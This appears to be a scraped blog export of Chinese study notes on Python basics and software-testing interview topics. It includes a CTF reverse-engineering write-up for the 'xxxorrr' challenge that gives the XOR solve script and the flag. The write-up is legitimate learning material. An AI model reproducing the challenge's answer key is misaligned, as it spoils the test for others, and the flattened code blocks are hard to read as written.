1234s='天涯共此时'print(s.encode(encoding='GBK'))#b'\\xcc\\xec\\xd1\\xc4\\xb9\\xb2\\xb4\\xcb\\xca\\xb1'byte=s.encode(encoding='GBK')print(byte.decode(encoding=\"GBK\"))#天涯共此时 函数创建，调用（1）函数作用：复用代码，隐藏实现细节，提高可维护性，提高可读性便于调试 （2）创建：def 函数名([参数]): 函数体 （3）调用： 12345def calc(a,b): #a,b为形参，在函数定义处 c=a+b return cresult=calc(10,20) #10，20是实参，在函数调用处print(result) #30 参数传递（1）位置实参：对应位置进行参数传递 （2）关键字实参：对应名称进行参数传递 12result=calc(a=10,b=20)print(result) #30 eg: 1234567891011121314def fun(arg1,arg2): print('arg1',arg1)#arg1 11 print('arg2',arg2)#arg2 [22, 33, 44] arg1=100 arg2.append(10) print('arg1',arg1)#arg1 100 print('arg2',arg2)#arg2 [22, 33, 44, 10]n1=11n2=[22,33,44]print('n1',n1)#n1 11print('n2',n2)#n2 [22, 33, 44]fun(n1,n2)#跳到fun()print('n1',n1)#n1 11print('n2',n2)#n2 [22, 33, 44, 10] 在函数调用过程中，进行参数传递，若是不可变对象，在函数体的修改不会影响实参的值；若可变则会影响 返回值（1）返回值有多个时，结果将以元组形式返回 1234567891011def fun(num): odd=[]#存储奇数 even=[]#存储偶数 for i in num: if i %2: odd.append(i) else: even.append(i) return odd,evenlst=[10,20,39,43,66,24]print(fun(lst))#([39, 43], [10, 20, 66, 24]) （2）如果返回值没有（函数执行后不需要给调用出提供数据），return可省略； 若返回值为1个，则直接返回类型； 若返回值为多个，则返回为元组； 12345678910def fun1(): print('hello')fun1()#hellodef fun2(): return 'hello'result=fun2()print(result)#hellodef fun3(): return 'hello','world'print(fun3())#('hello', 'world') 参数定义（1）默认值 1234def fun(a,b=10): print(a,b)fun(100)#100 10fun(20,30)#20 30 （2）个数可变的位置参数（只可为一个），用*定义可变的形参，结果为元组 1234def fun(*args): print(args)fun(10)#(10,)fun(10,20,30)#(10, 20, 30) （3）个数可变的关键字形参（只可为一个），用**定义可变的形参，结果为字典 1234def fun(**args): print(args)fun(a=10)#{'a': 10}fun(a=10,b=20,c=30)#{'a': 10, 'b': 20, 'c': 30} 函数定义中，二者同为形参时，位置参数放在关键字参数之前 12345678910def fun(a,b,c): print('a=',a) print('b=',b) print('c=',c)fun(10,20,30)#位置传参#a=10 b=20 c=30lst=[11,22,33]fun(*lst)#列表中元素转位置参数传入#a=11 b=22 c=33fun(a=100,b=200,c=300)#a=100 b=200 c=300dict={'a':111,'b':222,'c':333}fun(**dict)#字典中键值对转关键字参数传入#a=111 b=222 c=333 eg: 1234567891011121314151617def fun(a,b=10): print('a=',a) print('b=',b)def fun2(*args): print(args)def fun3(**args): print(args)fun2(10,20,30,40)#(10, 20, 30, 40)fun3(a=11,b=22,c=33,d=44,e=55)#{'a': 11, 'b': 22, 'c': 33, 'd': 44, 'e': 55}def fun4(a,b,c,d): print('a=',a) print('b=',b) print('c=',c) print('d=',d)fun4(10,20,30,40)#a=10 b=20 c=30 d=40fun4(a=11,b=22,c=33,d=44)#a=11 b=22 c=33 d=44fun4(100,200,c=300,d=400)#a=100 b=200 c=300 d=400 变量的作用域代码可访问该变量的区域 有效范围： （1）局部变量：global声明可将局部变量转为全局变量；局部变量仅在函数体内部有效 （2）全局变量：函数体外定义的变量，函数体内外都可调用 1234567891011121314def fun(a,b): c=a+b #c为局部变量 print(c)name='张三'#name为全局变量print(name)def fun1(): print(name)fun1()#张三def fun2(): global age age=20 print(age)fun2()print(age) 递归函数（1）一个函数在函数体内调用本身，即为递归 （2）组成：递归调用与终止条件 （3）每递归调用一次，就在栈内分配一个战阵，执行完之后再释放 （4）优点：思路代码简单；缺点：占用内存多，效率低 123456def fac(n): if n==1: return 1 else: return n*fac(n-1)print(fac(6))#720 斐波那契数列： 1234567891011def fib(n): if n==1: return 1 elif n==2: return 1 else: return fib(n-1)+fib(n-2)print(fib(8))#21 #输出前六位for i in range(1,7): print(fib(i))#1 1 2 3 5 8","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"python学习随笔记录","slug":"python随笔记录","date":"2022-09-11T03:14:15.901Z","updated":"2022-09-14T14:58:43.042Z","comments":true,"path":"2022/09/11/python随笔记录/","link":"","permalink":"https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/","excerpt":"","text":"strip() 删除两边空格 lstrip() 删除左边空格 rstrip() 删除右边空格 replace(“ “,””) 删除所有空格 split() 先切分 join() 再拼接 1描述 一串连续的数据用什么记录最合适，牛牛认为在Python中非列表（list）莫属了。现输入牛牛朋友们的名字，请使用list函数与split函数将它们封装成列表，再整个输出列表。 输入描述： 输入一串字符串，它们之间通过空格间隔开。 输出描述： 输出封装后的列表。 示例1 输入：NiuNiu NiuMei NiuNeng 输出：['NiuNiu', 'NiuMei', 'NiuNeng'] 解： 12345name=input().split(\" \")name_list=list()for i in name: name_list.append(i)print(name_list) 2 bin(x) 转二进制 hex(x) 转十六进制 ord(x) 字母转数字 abs(x) 转绝对值 sum(x) 算数和 max(x) 最大值 min(x) 最小值 count() 计数 pow() 幂乘 x**y=pow(x,y) x.isalpha() 判断字符串中是否只包含字母 x.isdigit() 判断字符串中是否只包含数字 x.isspace() 判断字符串中是否只包含空格 find() 查找字符串 round(f,n) 输出f四舍五入保留至n位小数后的结果 eval() 公式计算器","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习5","slug":"python学习5","date":"2022-09-06T08:43:42.900Z","updated":"2022-09-06T10:08:01.922Z","comments":true,"path":"2022/09/06/python学习5/","link":"","permalink":"https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/","excerpt":"","text":"集合python内置数据结构，可变序列，无value的字典。 创建： {} s={'Python','world',90} set() : s=set(range(6)) 12s={2,3,4,4,5,6,7,7}print(s) #{2, 3, 4, 5, 6, 7} eg: 1234567891011121314s1=set(range(6))print(s,type(s)) #{2, 3, 4, 5, 6, 7} &lt;class 'set'&gt;s3=set((1,2,4,4,5,65))print(s3,type(s3)) #{65, 1, 2, 4, 5} &lt;class 'set'&gt; #集合中元素无序s4=set('python')print(s4,type(s4)) #{'o', 'n', 'y', 't', 'h', 'p'} &lt;class 'set'&gt;s5=set({12,4,33,25,24,23})print(s5,type(s5)) #{33, 4, 23, 24, 25, 12} &lt;class 'set'&gt; #空集合s6={} #字典类型print(type(s6)) #&lt;class 'dict'&gt;s7=set()print(s7,type(s7)) #set() &lt;class 'set'&gt; 相关操作（1）判断： in 或 not in （2）新增： add() : 一次添加一个元素 update() : 至少添加一个元素 （3）删除： remove() : 一次删除一个指定元素，指定元素不存在抛出keyerror discard(): 一次删除一个注定元素，指定元素不存在不抛出异常 pop(): 一次随机删除一个任意元素 clear(): 清空 123456789101112131415161718192021s={1,3,5,6,4} print(1 in s) #Trueprint(1 not in s) #Falses.add(80)print(s) #{80, 1, 3, 4, 5, 6}s.update({100,200,300})print(s) #{1, 3, 4, 5, 6, 100, 200, 300, 80}s.update([100,98,89])print(s) #{1, 98, 3, 4, 5, 6, 100, 200, 300, 80, 89}s.update([78,64,56])print(s) #{64, 1, 98, 3, 4, 5, 6, 100, 200, 300, 78, 80, 56, 89} s.remove(100)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 300, 78, 80, 56, 89}s.discard(500)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 300, 78, 80, 56, 89}s.discard(300)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 78, 80, 56, 89}s.pop()print(s) #{1, 98, 3, 4, 5, 6, 200, 78, 80, 56, 89}s.clear()print(s) #set() 集合间的关系 是否相等： == 或 != 一个集合是否为另一集合的子集： issubset b是a的子集 一个集合是否为另一集合的超集： issuperset a是b的超集 两集合是否无交集： isdisjoint 1234s={10,20,30,40}s2={30,40,20,10}print(s==s2) #Trueprint(s!=s2) #False eg: 12345678910111213141516s1={10,20,30,40,50,60}s2={10,20,30,40}s3={10,20,90}print(s2.issubset(s1))print(s3.issubset(s2))print(s1.issuperset(s2))print(s1.issuperset(s3))print(s2.isdisjoint(s3))s4={100,200,300}print(s2.isdisjoint(s4)) #True #False #True #False #False #True 集合的数学操作12345678910s1={10,20,30,40}s2={20,30,40,50,60}print(s1.intersection(s2))print(s1 &amp; s2) #{40, 20, 30}print(s1.union(s2))print(s1 | s2) #{40, 10, 50, 20, 60, 30}print(s1.difference(s2))print(s1-s2) #{10}print(s1.symmetric_difference(s2))print(s1^s2) #{50, 10, 60} 集合生成式1234lst=[i*i for i in range(6)]print(lst) #[0, 1, 4, 9, 16, 25]s={i*i for i in range(6)}print(s) #{0, 1, 4, 9, 16, 25}","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习4","slug":"python学习4","date":"2022-09-05T09:05:23.791Z","updated":"2022-09-05T11:20:04.588Z","comments":true,"path":"2022/09/05/python学习4/","link":"","permalink":"https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/","excerpt":"","text":"(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断) 字典列表： [] 字典： {} 可变序列，以键值对方式存储数据 根据key查找value所在位置。 创建score={'张三':100,'李四':98,'王五':45} 内置函数dict(name='jack',age=20) eg: 1234567score={'张三':100,'李四':98,'王五':45}print(score) #{'张三': 100, '李四': 98, '王五': 45}print(type(score)) #&lt;class 'dict'&gt;s=dict(name='jack',age=20)print(s) #{'name': 'jack', 'age': 20}d={}print(d) #{} 元素获取 []: score[‘张三’] 若字典中不存在指定key,则抛出keyerror get(): score.get(‘张三’) 若不存在key，则返回None 12345score={'张三':100,'李四':98,'王五':45}print(score['张三']) #100print(score.get('张三')) #100print(score.get('陈六')) #Noneprint(score.get('嘛七',99)) #99 #99是嘛七所对value不存在时提供的默认值 常用操作key的判断 in : key在字典中返回True not in : key不在字典中返回True 123score={'张三':100,'李四':98,'王五':45}print('张三' in score) #Trueprint('张三' not in score) #False 元素删除del score['张三'] print(score) #{'李四': 98, '王五': 45} score.clear() #清空字典 print(score) #{} 元素新增score['陈六']=98 print(score) #{'李四': 98, '王五': 45, '陈六': 98} 元素修改score['陈六']=1001 print(score) #{'李四': 98, '王五': 45, '陈六': 1001} 获取字典视图的三个方法 keys() 获取字典中所有key value() 获取字典中所有value items() 获取字典中所有key,value对 12345678910111213score={'张三':100,'李四':98,'王五':45} #获取所有keykeys=score.keys()print(keys) #dict_keys(['张三', '李四', '王五'])print(list(keys)) #['张三', '李四', '王五'] 将所有key组成的视图转成列表 #获取所有valuevalues=score.values()print(values) #dict_values([100, 98, 45])print(list(values)) #[100, 98, 45] #获取所有键值对items=score.items()print(items) #dict_items([('张三', 100), ('李四', 98), ('王五', 45)])print(list(items)) #[('张三', 100), ('李四', 98), ('王五', 45)] 元素遍历12345678score={'张三':100,'李四':98,'王五':45}for item in score: print(item)for item in score: print(item,score[item],score.get(item)) #张三 100 100 #李四 98 98 #王五 45 45 特点 所有元素都是key-value键值对，key不可重复，value可重复 无序 key不可变 字典可动态伸缩 字典较大浪费内存，是一种使用空间换时间的数据结构 1234567d={'name':'张三','name':'李四'}print(d) #{'name': '李四'}d={'name':'张三','nikename':'李四'}print(d) #{'name': '张三', 'nikename': '李四'}lst=[10,20,30]lst.insert(1,100)print(lst) #[10,100,20,30] 字典生成式内置函数zip() 用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回由这些元组组成的列表。 {item.upper() （#这是key）:price(#这是value) for item,price(#自定义变量key,value) in zip(items,prices(#可迭代对象))} eg: 1234items=['Fruits','Books','Others']prices=[96,78,85]{ item.upper():price for item,price in zip(items,prices)}print(d) #{'name': '张三', 'nikename': '李四'} 元组python内置数据结构之以，不可变序列 创建 t=('Python','hello',90) 内置函数tuple() t=tuple(('Python','hello',90)) t=(10,) 单元素要加逗号用以区分 123456789t=tuple(('Python','world',90))print(t) #('Python', 'world', 90)print(type(t)) #&lt;class 'tuple'&gt;t2='Python','world',90print(type(t2)) #&lt;class 'tuple'&gt;t3=('Python',)print(type(t3)) #&lt;class 'tuple'&gt;t1=tuple(('Python','world',90))print(t1) #('Python', 'world', 90) 空列表、字典、元组 123456lst=[]list1=list()d={}d1=dict()t=()t1=tuple() 为何元组不可变（1）多任务环境下，同时操作对象时不需要加锁 （2）元组中存储的是对象的引用： * 若对象本身不可变，则不能再引用其他对象 * 若对象是可变的，则可变对象的引用不允许改变，但数据可以变。 12345678910t=[10,[20,30],90]print(t) #[10, [20, 30], 90]print(type(t)) #&lt;class 'list'&gt;print(t[0],type(t[0]),id(t[0])) #10 &lt;class 'int'&gt; 2150843443792print(t[1],type(t[1]),id(t[1])) #[20, 30] &lt;class 'list'&gt; 2150955913664print(t[2],type(t[2]),id(t[2])) #90 &lt;class 'int'&gt; 2150843634832print(id(100)) #2150843635152 #由于[20,30]列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变t[1].append(100)print(t,id(t[1])) #[10, [20, 30, 100], 90] 2150952344704 （3）元组遍历 元组可迭代，用for…in…遍历 123456t=tuple(('Python','hello',90))for item in t: print(item) #Python #hello #90","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"软测面试准备","slug":"软测面试准备","date":"2022-09-02T01:34:40.342Z","updated":"2022-09-02T14:44:04.935Z","comments":true,"path":"2022/09/02/软测面试准备/","link":"","permalink":"https://sinky.top/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/","excerpt":"","text":"基本linux命令 file: 通过探测文件内容判断文件类型，使用权限是所有用户。 -v 在标准输出后显示版本信息并退出 -z 探测压缩过的文件类型 -L 允许符合连接 mkdir: 建立文件夹，使用权限是所有用户 -m 设定权限 -p 创建上层目录 -v 创建新目录时显示信息，版本信息 grep: 指定文件中搜索特定的内容，并将含有这些内容的行标准输出。格式：grep 参数 -c 只输出匹配行的计数 -i 不区分大小写（只适用单字符） -h 查询多文件时不显示文件名 -l 查询多文件时只输出包含匹配字符的文件名 -n 显示匹配及行号 -s 不显示不存在或无匹配文本的错误信息 -v 显示不包含匹配文本的所有行 find: 在目录种搜索文件，权限为所有用户，格式：find [path] path指定目录路径，路径列表，互相用空格分离。 depth: 使用深度级别的查找过程方式，在某层指定目录种优先查找文件内容 数组和链表的区别及优缺点，如何结合两者优点1、数组 数组是将元素在内存中连续存放，由于每个元素占用内存相同，可以通过下标迅速访问数组中任何元素，但若在数组中增加一个元素，需要移动大量元素，在内存中空出一个元素的空间，然后将要将要增加的元素放入 2、链表 链表中的元素在内存中不是顺序存储，而是通过存在元素中的指针联系到一起，每个结点包括两个部分，存储数据元素的数据域，和存储下一个结点地址的指针。 若要访问链表中的一个元素，需要从第一个元素开始，一直找到需要的元素位置，但增删元素，只需修改元素中的指针即可。 3、区别 存储位置：数组逻辑上相邻的元素在物理存储位置上也相邻，但链表不一定 存储空间：链表存放的内存空间可以连续也可以不连续，但数组是连续的一段内存空间。数组存放相同多的数据数组占用内存较小，但链表还需存放前驱和后继的空间。 长度可变性：链表长度按实际可伸缩，数组长度是定义固定的。 按序号查找：数组可随机访问，时间复杂度为O(1)，链表不支持随机访问，平均需要O(n) 4、哈希表可以结合数组和链表的优点 测试的相关流程需求测试-概要设计测试-详细涉及测试-单元测试-集成测试-系统测试-验收测试 如何写测试用例1、测试员尽早介入，彻底理解清楚需求作为写测试用例的基础 2、若以前有类似的需求，可以参考类似需求的测试用例，还需要看类似需求的bug情况 3、清楚输入、输出的各种可能性，以及各种输入的之间的关联关系，理解清楚需求的执行逻辑，通过等价类、边界值、判定表等方法找出大部分用例。 4、找到需求相关的一些特性，补充测试用例 5、根据自己的经验分析遗漏的测试场景 6、多总结类似功能点的测试点 7、书写格式清晰 需求分析-需求评审-测试计划与评审-编写测试用例 测试的常用方法(1) 黑盒测试方法： 黑盒测试也称功能测试或数据驱动测试，它是在已知产品所应具有的功能，通过测试来检测每个功能是否都能正常使用，在测试时，把程序看作一个不能打开的黑盆子，在完全不考虑程序内部结构和内部特性的情况下，测试者在程序接口进行测试，它只检查程序功能是否按照需求规格说明书的规定正常使用，程序是否能适当地接收输入数锯而产生正确的输出信息，并且保持外部信息（如数据库或文件）的完整性。 “黑盒”法着眼于程序外部结构、不考虑内部逻辑结构、针对软件界面和软件功能进行测试。“黑盒”法是穷举输入测试，只有把所有可能的输入都作为测试情况使用，才能以这种方法查出程序中所有的错误。实际上测试情况有无穷多个，因此不仅要测试所有合法的输入，而且还要对那些不合法但是可能的输入进行测试 a) 等价类划分法：将程序中所有可能的输入数据划分为若干个等价类，然后从每个部分中选取具有代表性的数据当作测试用例。测试用例由有效等价类和无效等价类的代表数据组成，从而保证测试用例具有完整性和代表性。 b) 边界值分析法：对程序输入或输出的边界值进行测试（恰好处于边界、或超过边界、或在边界以下的状态） c) 因果图法：一种简化逻辑图，能够直观表明输入条件和输出动作之间的因果关系，适合于描述对于多种输入条件组合的测试方法，根据输入条件的组、约束关系和输出条件的因果关系，分析输入条件的各种组合情况，从而设计测试用例的方法，适合于检查程序输入条件的各种组合情况 d) 错误推测法：基于以往的经验和直觉，参照以往的软件系统出现的错误，推测当前被测程序中可能存在的缺陷和错误，有针对性地设计测试用例，列举出程序中可能犯的错误或容易发生错误的特殊情况的清单，根据清单和已经设计好的测试用例来编写特定的测试用例，站在用户的角度来考虑输入信息，而不必去管这些信息对于被测程序是否是合理的输入。 (2) 白盒测试方法： 白盒测试也称为结构测试或逻辑驱动测试，是针对被测单元内部是如何进行工作的测试。它根据程序的控制结构设计测试用例，主要用于软件或程序验证。白盒测试法检查程序内部逻辑结构，对所有的逻辑路径进行测试，是一种穷举路径的测试方法，但即使每条路径都测试过了，但仍然有可能存在错误。因为：穷举路径测试无法检查出程序本身是否违反了设计规范，即程序是否是一个错误的程序；穷举路径测试不可能检查出程序因为遗漏路径而出错；穷举路径测试发现不了一些与数据相关的错误。 白盒测试需要遵循的原则有：1. 保证一个模块中的所有独立路径至少被测试一次；2. 所有逻辑值均需要测试真（true）和假（false）；两种情况；3. 检查程序的内部数据结构，保证其结构的有效性；4. 在上下边界及可操作范围内运行所有循环。 a) 静态分析：不通过执行程序而进行测试的技术，关键功能是检查软件的表示和描述是否一致，没有冲突或者没有歧义。 b) 动态分析：其主要特点是当软件系统在模拟的或真实的环境中执行之前、之中和之后，对软件系统行为的分析。动态分析包含了程序在受控的环境下使用特定的期望结果进行正式的运行。它显示了一个系统在检查状态下是正确还是不正确。 i.语句覆盖：顾名思义就是针对代码语句，设计出来的用例要保证程序中的每一个语句至少被执行一次。 ii. 分支覆盖：使得程序中每个判断的取真和取假至少经历一次，即判断的真假均曾被满足。 iii.条件覆盖：要求设计用例时针对判断语句里面每个条件表达式true 和 false各取值一次，不考判断语句的计算结果（不考虑组合情况）。 iv.判定条件覆盖：设计测试用例时，使得判断语句中每个条件表达式的所有可能结果至少出现一次，每个判断语句本身所有可能结果也至少出现一次。 v.组合覆盖：设计测试用例时，使得每个判断语句中条件结果的所有可能组合至少出现一次。 vi. 路径覆盖：设计测试用例时，覆盖程序中所有可能的执行路径 说出几种基本的数据结构1、链表 是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。由一系列节点组成，节点不必在内存中相连，每个节点由数据部分Data和链部分Next，Next指向下一个节点，这样当添加或者删除时，只需要改变相关节点的Next的指向，效率很高。 2、栈和队列 是比较特殊的线性表，栈是限制插入和删除只能在一个位置上进行的表，后进先出。 队列只允许在front端进行删除操作，在rear端进行插入操作。 3、树 树形结构是一类非常重要的非线性数据结构，考察主要以二叉树为主 了解什么测试方法等价类划分，边界值分析，错误推测，因果图法，逻辑覆盖法，程序插桩技术，基本路径法，符号测试，错误驱动测试 设计一个微信朋友圈点赞的测试用例功能测试：点赞某条朋友圈，验证是否成功 接口测试：点赞朋友圈，验证朋友能否收到提示信息 性能测试：点赞朋友圈，是否在规定时间显示结果，是否在规定时间在朋友手机上进行提示 兼容性测试：在不同的终端手机上点赞朋友圈验证是否成功 HTTP报文段是什么样的http报文是面向文本，每一个字段都是ASCII码串，每个字段长度不确定， 1、请求报文： 请求行：request line,由请求方法字段、url字段和http协议版本字段三个字段组成，空格分隔。 请求方法： GET: 要求服务器将url定位的资源放在响应报文的数据部分，回送给客户端，传参长度受限制，请求数据以地址形式表现在请求行。 POST: 允许客户端向服务器提供较多信息，将请求参数封装在http请求数据中，以名称/值的形式出现，可传输大量数据，也不会显示在url中。 HEAD: 服务端接受head请求后只返回响应头而不会发送相应内容。 2、URL url: 同意资源定位符，是一种资源位置的抽象唯一识别方法，由子集URL和URN组成，&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt; 3、协议版本 格式为HTTP/主版本号.次版本号，常用为：HTTP/1.1 HTTP/1.0 4、请求头部 Host: 接受请求的服务器地址，IP或者域名 User-Agent：发送请求的应用名称 Connection: 指定与连接相关的属性 Accept-Charset: 通知服务器端可以发送的编码格式 Accept-Encoding: 通知服务器端可以发送的数据压缩格式 Accept-Language: 通知服务器端可以发送的语言 请求行：包含请求方式（get、post、put等）、URL，Http协议版本； 请求头：包含主机host，请求时间，客户端类型、指定客户端接收的数据格式，客户端支持的语言等 请求体：包含post方法提交的数据，也可以为空； 响应行：包含状态码、响应信息、Http协议版本； 响应头：包含响应时间，响应数据的长度、类型、字符编码等 响应体：包含页面源码； 压力测试对系统不断施加册立，通过确定一个系统的瓶颈或者不能接收的性能点，来获得系统能提供的最大服务级别的测试。 tcp udp 区别1、tcp面向连接（先建立连接再发送数据） udp无连接，发送数据钱不需要建立连接 2、tcp安全可靠，传送的数据无差错不丢失不重复且按序到达； udp尽最大努力交付，但是不保证可靠交付 3、tcp面向字节流,把数据看成一连串无结构的字节流; UDP是面向报文的，应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文 4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信 5、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道 介绍一下单元测试、集成测试、系统测试、验收测试、回归测试1、单元测试： 完成最小的软件设计单元（模块）的验证工作，目标是确保模块被正确的编码，使用过程设计描述作为指南，对重要的控制路径进行测试以发现模块内的错误，通常情况下是白盒的，对代码风格和规则、程序设计和结构、业务逻辑等进行静态测试，及早的发现和解决不易显现的错误。 2、集成测试： 通过测试发现与模块接口有关的问题。目标是把通过了单元测试的模块拿来，构造一个在设计中所描述的程序结构，应当避免一次性的集成（除非软件规模很小），而采用增量集成。 自顶向下集成：模块集成的顺序是首先集成主模块，然后按照控制层次结构向下进行集成，隶属于主模块的模块按照深度优先或广度优先的方式集成到整个结构中去。 自底向上集成：从原子模块开始来进行构造和测试，因为模块是自底向上集成的，进行时要求所有隶属于某个给顶层次的模块总是存在的，也不再有使用稳定测试桩的必要。 3、系统测试： 是基于系统整体需求说明书的黑盒类测试，应覆盖系统所有联合的部件。系统测试是针对整个产品系统进行的测试，目的是验证系统是否满足了需求规格的定义，找出与需求规格不相符合或与之矛盾的地方。系统测试的对象不仅仅包括需要测试的产品系统的软件，还要包含软件所依赖的硬件、外设甚至包括某些数据、某些支持软件及其接口等。因此，必须将系统中的软件与各种依赖的资源结合起来，在系统实际运行环境下来进行测试。 4、回归测试： 回归测试是指在发生修改之后重新测试先前的测试用例以保证修改的正确性。理论上，软件产生新版本，都需要进行回归测试，验证以前发现和修复的错误是否在新软件版本上再次出现。根据修复好了的缺陷再重新进行测试。回归测试的目的在于验证以前出现过但已经修复好的缺陷不再重新出现。一般指对某已知修正的缺陷再次围绕它原来出现时的步骤重新测试。 5、验收测试： 验收测试是指系统开发生命周期方法论的一个阶段，这时相关的用户或独立测试人员根据测试计划和结果对系统进行测试和接收。它让系统用户决定是否接收系统。它是一项确定产品是否能够满足合同或用户所规定需求的测试。验收测试包括Alpha测试和Beta测试。 Alpha测试：是由用户在开发者的场所来进行的，在一个受控的环境中进行。 Beta测试：由软件的最终用户在一个或多个用户场所来进行的，开发者通常不在现场，用户记录测试中遇到的问题并报告给开发者，开发者对系统进行最后的修改，并开始准备发布最终的软件。 tcp的三次握手","categories":[],"tags":[{"name":"软件测试，面试准备","slug":"软件测试，面试准备","permalink":"https://sinky.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"}]},{"title":"攻防世界RE-xxxorrr","slug":"攻防世界RE-xxxorrr","date":"2022-08-19T03:33:52.263Z","updated":"2022-09-02T14:44:04.932Z","comments":true,"path":"2022/08/19/攻防世界RE-xxxorrr/","link":"","permalink":"https://sinky.top/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/","excerpt":"","text":"xor 异或逻辑运算：相同为0，不同为1 ida64打开，找到关键字符串Congratulations,点进去查看伪代码 12345678910__int64 sub_916(){ __int64 v1; // [sp+8h] [bp-8h]@1 v1 = *MK_FP(__FS__, 40LL); if ( !strcmp(s1, s2) ) puts(\"Congratulations!\"); else puts(\"Wrong!\"); return *MK_FP(__FS__, 40LL) ^ v1;} s1与s2相同，返回Congratulations! 查看s1,s2值： 12s1=qasxcytgsasxcvrefghnrfghnjedfgbhns2= 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 0x2B, 0x26, 0x89, 0xFE, 0x00 查看main函数伪代码： 12345678910111213141516__int64 __fastcall main(__int64 a1, char **a2, char **a3){ __int64 result; // rax@4 __int64 v4; // rsi@4 signed int i; // [sp+Ch] [bp-34h]@1 char s[40]; // [sp+10h] [bp-30h]@1 __int64 v7; // [sp+38h] [bp-8h]@1 v7 = *MK_FP(__FS__, 40LL); // v7 8字节，我也不知道啥功能 sub_A90((__int64)sub_916); fgets(s, 35, stdin); // 从stdin中读取35个存储到s for ( i = 0; i &lt;= 33; ++i ) s1[(signed __int64)i] ^= s[i]; // s1和s异或，值传给s1 result = 0LL; v4 = *MK_FP(__FS__, 40LL) ^ v7; return result;} 不知道这玩意儿啥意思，看一下main流程图吧： s1和s2异或，然后跟s比较，一样就Congratulations， 那就s1和s2异或一下呗。 但还是不行，查看了一下官方wp,发现还有另一个异或，没找到，很迷，先贴一下官方exp吧。 exp: 123456789s2=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 0x2B, 0x26, 0x89, 0xFE, 0x00]s1 = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'print(len(s1))for i in range(len(s1)+1): print(chr(ord(s1[i])^ (2 * i + 65)^s2[i]),end='') # flag{c0n5truct0r5_functi0n_in_41f}","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"Python学习3","slug":"python学习3","date":"2022-08-18T10:07:24.521Z","updated":"2022-08-18T11:44:46.298Z","comments":true,"path":"2022/08/18/python学习3/","link":"","permalink":"https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/","excerpt":"","text":"列表变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。 （相当于数组） eg: 12345a=10list=['hello','world',98]print(id(list)) # 2957481570240print(type(list)) # &lt;class 'list'&gt;print(list) # ['hello', 'world', 98] 创建列表1、使用中括号[]，英文逗号分隔，调用内置函数list() 2、特点： 有序排序 索引映射唯一一个数据 可存储重复数据 任意数据类型混存 根据需要动态分配和回收内存 eg: 123list=['hello','world',98] print(list) # ['hello', 'world', 98]print(list[0],list[-3]) # hello hello 列表查询获取指定元素索引 index() 列表中有相同元素，只返回第一个元素的索引 查询元素不存在返回error 可指定范围 eg: 1234list=['hello','world',98,'hello']print(list.index('hello')) #0 #print(list.index('hello',1,3)) #'world',98,范围内无'hello'，返回errorprint(list.index('hello',1,4)) #3 获取列表中的单个元素 正向，从0到n-1，eg:list[0] 逆向，从-n到-1，eg:list[-n] 不存在，error 1234list=['hello','world',98,'hello',324]print(list[2]) #98print(list[-3]) #98 #print(list[-8]) #error 获取列表中的多个元素列表名[start:stop:step] eg: 1234567891011list1=[10,20,30,40,50,60,70,80]list2=list1[1:6:1]print(list2) # [20, 30, 40, 50, 60]print(list1[1:6])print(list1[1:6:])print(list1[1:6:2]) # [20, 40, 60]print(list1[:6:2]) # [10, 30, 50] #step为负数print(list1[::-1]) # [80, 70, 60, 50, 40, 30, 20, 10]print(list1[7::-1]) # [80, 70, 60, 50, 40, 30, 20, 10]print(list1[6:0:-2]) # [70, 50, 30] 判断元素在列表中是否存在元素 in/not in 列表 列表元素的遍历：for 迭代变量 in 列表名： 操作 eg: 123456list=[10,20,'python','hello']print(10 in list) # Trueprint(100 in list) # Falseprint(10 not in list) # Falsefor i in list: print(i) #10 20 python hello 列表增加 append() 在列表末尾添加一个元素 extend() 